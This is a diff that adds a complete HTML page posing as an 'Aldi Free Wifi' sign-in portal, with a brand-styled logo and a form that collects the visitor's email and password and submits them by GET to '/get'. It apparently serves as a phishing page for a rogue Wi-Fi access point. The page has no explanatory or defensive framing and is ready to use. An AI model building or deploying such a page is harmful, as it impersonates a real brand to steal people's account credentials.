@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f3f3f3;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+.container {
+  max-width: 500px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  background: #fff;
+  border-radius: 8px;
+}
+
+.logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+
+.logo svg {
+  width: 50%;
+}
+
+.title, .sub-title {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.form-group {
+  margin-bottom: 20px;
+  display: flex;
+  justify-content: center;
+}
+
+.input-field {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+}
+
+.button {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  background-color: #1a3b73;
+  color: #fff;
+  border: none;
+  border-radius: 5px; 
+  cursor: pointer;
+}
+
+@media screen and (max-width: 600px) {
+  .container {
+    margin: 10px;
+  }
+
+  .logo svg {
+    width: 70%;
+  }
+
+  .input-field, .button {
+    max-width: 100%;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 351.1 421.3" enable-background="new 0 0 351.1 421.3" xml:space="preserve">
+<path fill="#FFBF45" d="M0,14C0,6.3,6.3,0,14,0h323c7.8,0,14,6.3,14,14v393.2c0,7.8-6.3,14-14,14H14c-7.8,0-14-6.3-14-14V14z"/>
+<path fill="#FA6E0A" d="M31.6,33.4c0-3.9,3.1-7,7-7h273.9c3.9,0,7,3.1,7,7V388c0,3.9-3.1,7-7,7H38.6c-3.9,0-7-3.1-7-7V33.4z"/>
+<path fill="#F03D14" d="M47.4,40.4c0-1.9,1.6-3.5,3.5-3.5h249.3c1.9,0,3.5,1.6,3.5,3.5v340.6c0,1.9-1.6,3.5-3.5,3.5H50.9
+	c-1.9,0-3.5-1.6-3.5-3.5V40.4z"/>
+<path fill="#001F78" d="M56.2,43.9c0-1,0.8-1.8,1.8-1.8h235.2c1,0,1.8,0.8,1.8,1.8v333.5c0,1-0.8,1.8-1.8,1.8H57.9
+	c-1,0-1.8-0.8-1.8-1.8V43.9z"/>
+<rect x="75.5" y="52.7" fill="#00B5DB" width="200.1" height="200.1"/>
+<rect x="84.3" y="57.9" fill="#001F78" width="182.6" height="189.6"/>
+<path fill="#FFFFFF" d="M274,279.1h-21.8v63.4H274V279.1z M222.4,310.8c0,12.2-0.3,18-7.3,18h-1.8v-35.8h1.8
+	C222.1,292.9,222.4,298.8,222.4,310.8 M244.3,310.8c0-30.8-10.4-31.6-32.5-31.6h-20.3v63.4h20.3C234,342.5,244.3,341.6,244.3,310.8
+	 M185,342.5l-2.1-17.2h-15.7v-46.2h-21.8v63.4H185z M140.2,342.5l-18.3-63.4H94.8l-18.6,63.4H98l1.7-7.3H115l1.8,7.3H140.2z
+	 M112.4,321.8h-10.1l5-25.7L112.4,321.8z"/>
+<polygon fill="#00B5DB" points="150.2,242.3 138.9,242.3 189.2,63.2 200.6,63.2 "/>
+<polygon fill="#00B5DB" points="131.3,242.3 119.9,242.3 170.2,63.2 181.6,63.2 "/>
+<polygon fill="#00B5DB" points="112.3,242.3 100.9,242.3 151.3,63.2 162.7,63.2 "/>
+<polygon fill="#00B5DB" points="174,184.3 177,173.8 256.3,173.8 256.3,184.3 "/>
+<polygon fill="#00B5DB" points="179,166.8 181.9,156.2 256.3,156.2 256.3,166.8 "/>
+<polygon fill="#00B5DB" points="169.1,201.9 172,191.3 256.3,191.3 256.3,201.9 "/>
+</svg>
+
+</div>
+
+<h1 class="title">Sign into Aldi Free Wifi</h1>
+
+<h2 class="sub-title">Sign in with your Email Address and Password to start browsing</h2>
+
+<form action="/get" id="email-form-step" method="GET">
+
+<div class="form-group">
+<input class="input-field" name="email" type="text" placeholder="Email" required>
+</div>
+
+<div class="form-group">
+<input class="input-field" name="password" type="password" placeholder="Password" required>
+</div>
+
+<div class="form-group">
+<button class="button" type="submit">Sign In</button>
+</div>
+
+</form>
+
+</div>
+
+</body>
+</html>
